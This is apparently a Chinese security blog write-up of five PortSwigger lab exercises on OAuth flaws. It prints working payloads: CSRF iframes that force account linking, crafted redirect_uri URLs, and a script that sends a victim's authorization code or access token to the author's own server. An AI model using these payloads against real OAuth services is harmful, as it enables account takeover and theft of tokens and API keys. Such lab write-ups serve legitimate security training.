#  OAuth 2.0 身份验证漏洞--portswigger打靶  
原创 小凡
                    小凡  小凡安全   2026-06-28 10:33  
  
# 通过 OAuth 隐式流程绕过身份验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2wicFl8coVvCD4PKwT8qSXN2KfVHCZ6oKp96pRCdUtPZvbNYERibZHibAqoVuQu4DU0qDlSAq0RtXvvD47YXGHP79sDtC0eliaVoE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2gEiaEjoa1x5NicibicFGd9wbOdbGBbhxxNibibQDhlkkn8DBA4SfQxFXtLg5gb1bbgNTwGELrJL3iaSIId6jk5eRtdYaSu7I7yyMr9Y/640?wx_fmt=png&from=appmsg "")  
  
授权登录抓包  
  
获取其中这个包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2Y6UiaVE9nVibOYUD7HK8wosEGqsetELkqnMybnzuSOgo5dF8KXbrw1NjMMqa9LrIaTa2hKYMcP3I1Eia35Y70u4OKIEWbLfgx1E/640?wx_fmt=png&from=appmsg "")  
  
修改email看是否报错  
  
修改没有报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn19VJ5TzM7gzxh6Z7tTPibeibqbp0yhiaNB91SMdckVlXAINWO8y5qjicvoooMXaIRq75dNx7oay59y5EewWNdxXWquSZftIS4ApFQ/640?wx_fmt=png&from=appmsg "")  
  
当前网站退出登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3qHrlzglcLnMTibx2JW4fMiaGqb7rYvgEgxSISeh50l45B1PqskllO20ePJHELLBZIpwdibEDgABjZKE3Pz9XrbnRy28GOZnDnO4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1N5S5XzWHJAgqcn85OFuhW1s2Dh07MsaAUaep7kk2Yic84ckvUM1TlM9f21RibpbN9vHZo5EukDCPP1uEsaquGw5Qy4E69osd7M/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3Z2FF3FcbLfFVicCXB5R4pAXDmJ5JiarSIKaFvibWpoF8vXU2OMgQ3ycMevZul0MpceeWUqsfQiao1iaX9K9clWCwRbiayZIhLTM7icQ/640?wx_fmt=png&from=appmsg "")  
  
在浏览器打开  
  
登录carlos成功，通关  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1QONDpqwjiaPvibzfETl8m4XCAYR5t9Lnw3nLuNJp7drSnTvymvGs3ST6KcVZwY5cTvHkNfmUQJYJBBosicEahVSC0l397D43Hy0/640?wx_fmt=png&from=appmsg "")  
  
# 强制 OAuth 配置文件关联  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0bdFHMEJhOvdBnf6yibEWxkJ54affSpDs3cI2r8ONSHibCZLjYrnS3FPpDrtelKAaYdVgGgSKxkafEB9m0STLfp27mfhy21q2xE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3lgVZ6uTeiaCa9c0KWsYYljzr0zwl6lLeOiapMhREkkicGkh77ugJmXVZRaw8k5pHOS3KLrOoalKutCbvQh5gKMX1TxdB4YibE7iaQ/640?wx_fmt=png&from=appmsg "")  
  
登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn248ibAyXumOgaHkY5wia6Hb6B541hf7jOq4MgrFgvPIYazKdoNdltJ04icibwjiauMWiak7TialGytSkVc4njibt2JZa2AMicDvYpDf9Po/640?wx_fmt=png&from=appmsg "")  
  
观察页面可以使用社交媒体绑定登录，先使用博客账密登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn01uWceC6yGucQXS6d51j8gflibjgmdiaCUpMWz4hGdiaHlDNVqBH8WWhAyAj9FwMLfrCoYlmXkiaXK21DRE0QQPLsQ22MYG738Avw/640?wx_fmt=png&from=appmsg "")  
  
绑定社交媒体  
  
在授权绑定的时候进行拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0MoAo0zjjicWNk35WOzyUaYTpuGicpsNkB7Ew3H5qKBicYQum7Nb51kzhVTp6cwyrCIRMkADJXWuIic30TQhRrerN7CUbnk5ho9rA/640?wx_fmt=png&from=appmsg "")  
  
获取code的包丢弃，如果直接发送，账号直接绑定  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn05VWxj0zKzqM9Of4HqyGEib0HQmsibHahQZS738ML8QZPvWUmMcNVWqJLgT37GbrSYISvB2VTjp2mIfxvHozXZY2Dqic7GdEibibq8/640?wx_fmt=png&from=appmsg "")  
  
在上面这个包可以看见里面没有  
state说明可以csrf  
  
将刚丢弃的包的url复制，并封装在iframe中  
```
<iframe src="https://0afe00ec04343a8180e1e460008e0064.web-security-academy.net/oauth-linking?code=vpYTZJSr1tmNeuMszyigUY9YgY4-VQ6N9t5xgdG1Ktx"></iframe>
```  
  
  
使用漏洞利用服务器，保存并发送给受害者  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1WLDmd6olv6aXicle2JzrFQzQLdh99KfJ1x9uLDdDxP5Hwdm0ZLDxj8sTecMKnkyFevxkPf0Tyv8CRRNyoYTLViajbax0QLS5V4/640?wx_fmt=png&from=appmsg "")  
  
这时候社交媒体就绑定了网站管理员的账号  
  
使用社交媒体登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0nwky6ObvSCZWXwLHny7obgjOc4sJpB7Rz5tU2gicNgGQHhaj125XcZiciaSanpSbK4df3tDcWQ5URS3l5Cpaee4UUSZ2BgNKYj8/640?wx_fmt=png&from=appmsg "")  
  
管理员比普通用户多一个admin panel  
  
删除管理员，通关  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0nOU50GiczbeCeHYItIrmaphicxY9p4l766eEpv793bzKE9YncYKuKicvplbyXEZczI8icHibMicREE6k3ON48C5L6IVJYpLNJZf8LE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3BiaIAuCGwJ6kbLwiaY7S3AYL1r6efwIscngxWekSTRSAXLyB4ibeQCDhFq5TiaSbBiak3eXmze0RMeB640qqPMX86JPE0Ob4EboFU/640?wx_fmt=png&from=appmsg "")  
# 通过 redirect_uri 劫持 OAuth 帐户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3JGibTdNhRpWLnWgb90gicfn8M2Q9WTOhuj178iaPEC7ldSggtNJtQzbjJTYmsIeptKswmx0wYaQN82szWfkDqapzLvB35cdUCo8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3QpnicTzUVOmw9Vsy2Ee7L6C1bBt9FxgF6TagKp27tz8nAOXGiaJQeAbXOQleTkic3hyVuJiceyGq0u5Qk0q1QJMTYgDRQiavC8Exw/640?wx_fmt=png&from=appmsg "")  
  
使用社交媒体先登录  
  
抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3wiaPL3HMSrHE2jyYqO0KMt5INicTdiaHBngVVlZokjM7VAiavmcpKEaVw6OAv7zXw9GdTiaO5F8QRfOzXk6rJicjUdMzdzeNKY3vHM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1diaoE1gL06iaHK6aJwUXoEDYiahEKDsg1b2DV4zljaPcszLwwibMiajaBzicLbHKYPMzABiaTOYltvD8ejUNAlKO25Oib22YLTLWxMtg/640?wx_fmt=png&from=appmsg "")  
  
分析上面两个包  
  
第一个包发包会被重定向到  
redirect_uri，然后返回code  
  
第二个包使用code授权登录  
  
修改  
redirect_uri并不会报错说明这里并没有校验  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0wsSh7tF2dbJhX9iaBnJVMJw1nIicoRJR5uKwCyS9eBPUPpnibD59wDzaejlfk5fogLukdE2TQBVUnYB3XzgpPtynhM48QtHX1Oo/640?wx_fmt=png&from=appmsg "")  
  
换成baidu.com  
```
https://oauth-0a8f0045046d176f8173ffbc02c900f3.oauth-server.net/auth?client_id=aqprtq5t2y6lhjlevbg54&redirect_uri=https://www.baidu.com&response_type=code&scope=openid%20profile%20email
```  
  
浏览器访问发现code被百度带出  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3N7SqQroERJzxVMJA675jXBLOuBHfpqqIH9By0N9e3Td8pr8czR4pibCNZHGQib8a3lRTWhzu8uEB8CFPldmCGPU2Ob0BFiaWFzc/640?wx_fmt=png&from=appmsg "")  
  
将  
redirect_uri换成自己的vps进行，打开另一个浏览器进行访问  
  
授权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3IVGndbNY2g9b4NFwSOyP6b52gcQPL87M1KTkPqhFSH9uT5zzNibWeJT1zoBW4rHa8d6ON3icH2oAjWnCWSljStVtdjiaJnjSTXU/640?wx_fmt=png&from=appmsg "")  
  
跳转到我们自己的vps  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0NjguMSd0lZt2xQINyh2nPVY0AzkvxhxHNrmZMzFbKkzAsMv1Xb7UCdfIwibP2Jt1sgK1vGyCJbSYxz0EnwwicibKHvrRnTXHNkM/640?wx_fmt=png&from=appmsg "")  
  
并在日志中可以获取code  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1OVfKpwQMbhZ6ZTRhzlEajWFIjkUQ88ic8JcG5O5JTmGN8VBaMSlc7iclzPhu3Yvw9SzYrGFyib7wSUQJgjVLVe2DkPugrHZ3VOI/640?wx_fmt=png&from=appmsg "")  
  
将上述条件的url放在iframe中  
```
<iframe src="https://oauth-0a8f0045046d176f8173ffbc02c900f3.oauth-server.net/auth?client_id=aqprtq5t2y6lhjlevbg54&redirect_uri=http://yi.xiaaaaain.asia&response_type=code&scope=openid%20profile%20email"></iframe>
```  
  
在vps上创建1.html，将代码放入  
  
用户只要和OAuth 服务保持活动会话访问vps的1.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3aolrobNlibJL3ibKADRAzVj7EB35z1Xdicd7cyooKTViaiaQuhpX1v4iclic095hvCZgd4c8WQgtyzHGQEyPFTUnnWCbhUO2nJRHQ9M/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0QMdkqVwFUIh2fnQ061LU1NnlmibzMRewDjuG86mKYR6FO8xrWCmyrv1zUaqPa447BfP7QtvoCIaHDwfO4dG22fQKcGWMrH63s/640?wx_fmt=png&from=appmsg "")  
  
就能获取code  
  
将iframe代码放入攻击服务器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1vdhFABzXibqYHHiaWOzWxJ41R4GlWQDFOO1HOnQaSzFGK54EnoCBSPaM5icgOzbcva890520dQzDsj5LVmwTSpofSEB9kMqmKl8/640?wx_fmt=png&from=appmsg "")  
  
保存发送获取网站管理员的code  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0z0jZvCaYhKqSFpFZFJkgE1R2T03xm113FwiadZwHj2sibjNewAOkXjQXia3WHe4FkAdKb1iasEoLZYFRtv5nicvQv3iaKzQZSdL4Ow/640?wx_fmt=png&from=appmsg "")  
  
使用code登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1cG5zXiaZbOtejYRWuib3Y062epPicwnyz0J2SxCibwxHzmIP5vgcBfWibicAbxChjylPy1D3P8V2aKmj6dTdmOEP2oOUHLvHDIdvPo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3lgoPLOLOQROwLZXnM36YEBqiaxBTLH24gB0YhnQgCLdfs1k3XUwV6y2uyPteXOAP4qC6hE6pQr067fxorj45KRU5BcvP1Dl9s/640?wx_fmt=png&from=appmsg "")  
  
动作一定要快一会code过期了  
  
查看身份  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1rwUEGUypqSsicrAeCn06n3CnHFINyIeXiazZdAJUhicleoqjptBDjNqjibzQoDChEee9icVD7dlWgM2SnkY8U4uib2Z6TMlx227ll8/640?wx_fmt=png&from=appmsg "")  
  
删除  
carlos，通关  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2icH5xicAvmZPVBIic1tyUqIfMXbaTqFsXRm7Chra93qo3UF9A5QDdjs3PicQoqbcaaNsicDnfiaR2Lsk9ovW2BNskdZibWyibcaQOQos/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0wMhSWZ16RM01jvEAOC4U0EGeNRHomcwmXXN4j9Q0p5y17IicZxGxcbyLOrMh4e3z7AeNicRqS53s1KBeXxzibJ30NicRENK4JYicE/640?wx_fmt=png&from=appmsg "")  
# 通过开放重定向窃取 OAuth 访问令牌  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2ia0ou63pxZlUryeHaAAjceicSXsEZlgqSm3U1kCE9sRN00ibUL9LIEDUsMtjGPJd9Sk7h0ZPULp7pj4ickeCgY1Herfvk6qJib4oI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2dIpTwJics6URZLdGbQjugVr9bKHOayziaRTREyckejiaDTWlDyyHb5XF5JfCpcf96lLlafEvc21OFFDsicor2oib7XKC7FwEibBEk8/640?wx_fmt=png&from=appmsg "")  
  
授权登录抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn23RqicibOzH3nasPjwfZEy18Upqwvrl4CicQ4XJuMMxGfAazKzfMQrXrddAovujrxcxoictljLRE4rNBp3IL7nBdjvB6Z5IibPQKCU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn31dfa7dDDecMBvH1B7Rt4WiaaAAHMoNyjPMoabKYIcjVW4bHKQZZxdq4sK9ibt2ccCfYJT4gVqCnYuQyChTECIJPXdZy4G6NNh0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0EEBJZSgQqbjJ1kNp70ibOtfu9v01G3gH4R2FsALzSd5RNKbicY18GEjMic3rjdyibllduiboPgFDccibibNEJcaRwmibUV4OgwbvaZWs/640?wx_fmt=png&from=appmsg "")  
  
包重定向redirect_uri并在[#后面跟上]()  
  
access_token  
  
第三个包   
Authorization: Bearer 跟上  
access_token的值获取apikey  
  
所以我们只需要获取管理员的access_token就可以获取apikey  
  
对redirect_uri作了校验  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1GtOsVSqaKWzsXicEsPgWdQMMfkicE4SFlNeC8xbWyLkUqhyvPSnCGBkvmkWBh2icRdhba4b5w32COFpQrwhGsdvrS16pIkEH35I/640?wx_fmt=png&from=appmsg "")  
  
使用本站url跳转来解决  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2h4xD70rU5RsKCny9On027Vr5RgHAg3TQgF7sOmTWJUxXI4U6f08jfKoAKBzDxs0Ow7kibvq5KxiaktQPeLWXcrBu1xicE437ntM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2KHuJeroVVIGzye9icLfHb9xAf4qpsmAsaZ39tMiaU6jNzN2riar572ZicNZtpYYSEzWMzas88n9HrXicsTp4UwS6tPibgl9bTve6Z0/640?wx_fmt=png&from=appmsg "")  
  
抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3ia7ufNFQVvibVYsRzSVJ5Bxt7ibiaCKlYd9mlzIp7yXfANN1g3bErH9t8Kn6ic81GrHbg7T12eSE4bnqBAx9BhjcI8bQ7upCuLI4k/640?wx_fmt=png&from=appmsg "")  
  
替换成baidu.com  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2vXAZC4A6kiaRVTXx4A3N2AiaYyOuexwZeQ6q9TogRIOlab0UK1NvyBNUtXUl1PZDQVLaBMlFvrOEibfq1adtssaW3Bof0k9zRicE/640?wx_fmt=png&from=appmsg "")  
  
直接跳转到百度  
  
将  
redirect_uri换做302跳转的url,失败，说明也验证了路径  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2hwuIn2NtuuoggJLa01a6vrv0FsRYtLBnPReyE7nCkl299HeXDsKkIcuVMXN5HBvv8MibDhabPbRZUHR8csAw0xDLD7PLA6YeA/640?wx_fmt=png&from=appmsg "")  
  
可以使用  
```
../
```  
  
构造  
```
https://oauth-0a9a008c0493328b80ad01be02730004.oauth-server.net/auth?client_id=z9wq8prwotbcqg5se1ukc&redirect_uri=https://0afe006a04d132f780cc035b0081005c.web-security-academy.net/oauth-callback/../post/next?path=http://www.baidu.com&response_type=token&nonce=1674055478&scope=openid%20profile%20email
```  
  
访问，可以看出  
access_token被带出  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0ibyItiaDjaoRTzHJ7zW5w2PVFNAIrtNfbVMW5Or7E8oIoVRG25QBLpjWKz8PU0kUgpVVHz5cyz0k7aPBJEn543TjbfIHgtRlmE/640?wx_fmt=png&from=appmsg "")  
  
使用js获取[#后面的参数]()  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1a6P7YAjwHfO7bueQg6kicqpiayZsoPiaO1UT8aKwEZefr1zO5IsBaVN2oTaknicguNSyfdpsicTxM5oQR81pbKnjqib61mW1fnZ5Zk/640?wx_fmt=png&from=appmsg "")  
  
使用vps测试  
  
编辑112.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2UBqBAcxRpeytFic8X1LQib2PfqoQqePibU0ssJ2diahlOQ14axZAUqeSzNGq1Evyy41jK3K9Nmcp0KVEkvoNtskaic8GhbEwW6pWk/640?wx_fmt=png&from=appmsg "")  
  
浏览器访问  
```
https://oauth-0a9a008c0493328b80ad01be02730004.oauth-server.net/auth?client_id=z9wq8prwotbcqg5se1ukc&redirect_uri=https://0afe006a04d132f780cc035b0081005c.web-security-academy.net/oauth-callback/../post/next?path=http://yi.xn.asia/112.html&response_type=token&nonce=1674055478&scope=openid%20profile%20email
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1RNHicVLutsa8ialElhibOic1KfIGfnXtMgePc1icStqL8EsZB7zpIZ3u1ZCibtLKS9SuzNGAhffYuIOojz4TcnJic88Ax5JJjTnTKpE/640?wx_fmt=png&from=appmsg "")  
  
获取其中  
access_token  
  
改进一下脚本  
```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a9a008c0493328b80ad01be02730004.oauth-server.net/auth?client_id=z9wq8prwotbcqg5se1ukc&redirect_uri=https://0afe006a04d132f780cc035b0081005c.web-security-academy.net/oauth-callback/../post/next?path=http://yi.xilin.asia/&response_type=token&nonce=1674055478&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```  
  
访问vps即可获取  
access_token  
  
使用攻击服务器  
  
确认，发送获取管理员的  
access_token  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2GcojnE7RKPqJGbQIN50BiaT26I4rQ0HSoVcc2mv2HR1jSiaP0VicibnuEJLG5xaGqfYgiaeEAuwOWgFVDqzDsfpvTnuYL5IN6Vlos/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2OicczVia7Tx3icfOnVU0TybxK4yGuDeExNic28zybROOkk0qz8HPZKqvGudA9lkAo4rKRqEYdKp8CgkhoXJlSaR0WdKcOaoHED88/640?wx_fmt=png&from=appmsg "")  
  
将Authorization: Bearer换做管理员的  
access_token即可获取管理员的apikey  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2fKIyD6VePz0uHYDUibfkSw1ozJC7trLbmz86KrQl0qnTufjZxcLLNNk91wjicx3eMY2ACTwLKKBlkD7FrMRFy70CaKcXNibOZB4/640?wx_fmt=png&from=appmsg "")  
  
提交通关  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3kq4tkyxrbLe4yglaSlmFz9sJlCdvcULcDic6DRSz1aQoico6Mkh3tn1Y8HQx25libs0qnG70BXTwbTVsSicCyWkVjjbAqEnNvM58/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0dMGb66aFwr7sjommd4P9T9ScZzUXw5WQ4n4c01icQso03eeb1gYszbC3e4I5K7RicFtc7tJ930jORHtqEw8Dg0NU1xq7PV7bgo/640?wx_fmt=png&from=appmsg "")  
  
# 通过代理页面窃取 OAuth 访问令牌  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0AJpYZ6Xw6dFfoTvPJX5RFibAoO934fTN4RNTKKxyOLeWibzicOiciaYmsmlT5uzKeN3DJHIG2iaiab22Go33b2FG4DWRDXPpyWACdMg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2eBiayUPvez4NKibGnzHBrbR1QH6O6pUg0HfIOxmicfUkibBiaeKiaQuW8AicevUduk9icvx84hHvawMUk7PsMwkpluupbpTA8BBvqzbc/640?wx_fmt=png&from=appmsg "")  
  
登录抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1UiaKn8K0WYTL4oufwg9Unl9iambJ9Fic2Sia1ticF9Tn6icHhd9AmibagrAlC5lrInoHcnHf1tGhMKTkZXfWIxGxRBbf2xFzmzMU0MY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0vcZvibusIxTeFrsmbaUY1VgOqdeUeV6Ucqib6a1WUbiaSeFOSjqhOhZRqjxhSM9NAUBzVxbGJDSJucgwQwas69DMCpstNNyWuxU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1Xj9bRhEvUgkPqwqgxE8SSSfhyzktD2N0FyLiaIKxtanxL2tcqhx1ial841ia08icN0IdOFOEEyOIMc2jMKueDic13s9KDhLAXeuc8/640?wx_fmt=png&from=appmsg "")  
  
关键数据包和上一个实验相同  
  
同样  
redirect_uri做了白名单  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3bNGf3icdmPBngjqEcuLPEuaFvXYoFpkJApN2GT3b0t8C7LKgydf5LKRZXQm635bWZxFW7IdJAlrm7B7VOEDgoViaia6BPMJ84AY/640?wx_fmt=png&from=appmsg "")  
  
寻找站内其他漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0fkeI65KHXT0BHOX9Ee3qyTqNlNiaKulZMvibicSMFkial4eSXyskO6Uh4mMIoVetkpRK3D3r3kIxP9ib1GAqJuEjOK9icLtXiadG7Yw/640?wx_fmt=png&from=appmsg "")  
  
抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3HQ1B31HBf28iaz2uaW68ib4WKP1xeInAADK79P0V6rLeeibzlayPS4fnUc7JHpzDxnibBIWRVA8zLQLEao180PK1j0xRTxv8BHdU/640?wx_fmt=png&from=appmsg "")  
  
漏洞点  
```
parent.postMessage({type: 'onload', data: window.location.href}, '*')
```  
  
子页面（iframe）向**父页面**  
发送跨域消息，通知父页面：当前 iframe 加载完成，并把 iframe 自身完整 URL 传给父页面。'  
*' 允许任意域名接收这条消息  
  
思路：  
redirect_uri换位这个漏洞点的url,在使用iframe将oauth请求的url放在其中，iframe加载完成就将iframe中的url发送给父页面，在父页面使用js获取  
access_token  
  
同样使用../绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1Uibek2YnkLl40hLSeq50B6qWPCxVVVVb29RvX0uPMnSDhEV3K4S16pB5l73zna3EPKxdBwQEibjqOJicpskMwh9ib3QOicpUticfEo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2eKU71iakCGZN19LmQN2Z0CJdRf3ViaKucAv5e05HJPEDB0pZlQElL2HfWBqFPnaftYeyxxYF1gwoEc7BvMw4EhyANVqgyYxRTg/640?wx_fmt=png&from=appmsg "")  
  
访问vps  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2I6eGickeglwAcPAHXmWgkibW9ulF8fsxfOUtJdH7g0NZBhAibRKxRSVORtAF82lwgKPiazYJVKQpRqHT46WeCy2o8WBGUCYMmfew/640?wx_fmt=png&from=appmsg "")  
  
成功获取管理员的  
access_token  
  
在攻击服务器上搭建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0SwhwvyxTUnWoZljQ2hv1nKiaicugolpuwyN6D2Fov2vfVqzBkOMTn1DF0TKGsNs9WFqlXrTgePODa0zBLUurkKQerOJZdkqr0E/640?wx_fmt=png&from=appmsg "")  
  
保存，发送获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0iaOia0fmic0fqEXx8qmEJWkDyR0vIZStByjtMUY9q2ctTR5rT0Nez5KrckGH61ibZwmUnEdx6s9nKicGpQPiaxHxzUr2fiah4iacg8NU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2qAC8FjyfH0GdZqOAlG4Bpxt9c9xgFRuaYgtIROs0YNM8rGXeJQPrVPsFPlMgGBsWxD5cl2BEraqQR9Mqdq3lHgaTlkOk0mlo/640?wx_fmt=png&from=appmsg "")  
  
相同步骤获取apikey  
  
填写，通关  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1neuTJJUuPFAIyvrfXwItN1Z9w20GTHjib3AanYCjBrndnVJhbRGY82WiaznzdSWraWyWgJexftrrBuSrTqVxnn5P0KWUTmiasUk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1oSWQEicgBv7RARff9IOmxW6QvzWCVHH624MvpeoL4bGicgzlVIvy4CzNjIF4iaeIWnddskEfHfdHxZKQWKPhjBwDu0uSdEZ10aY/640?wx_fmt=png&from=appmsg "")  
  
  
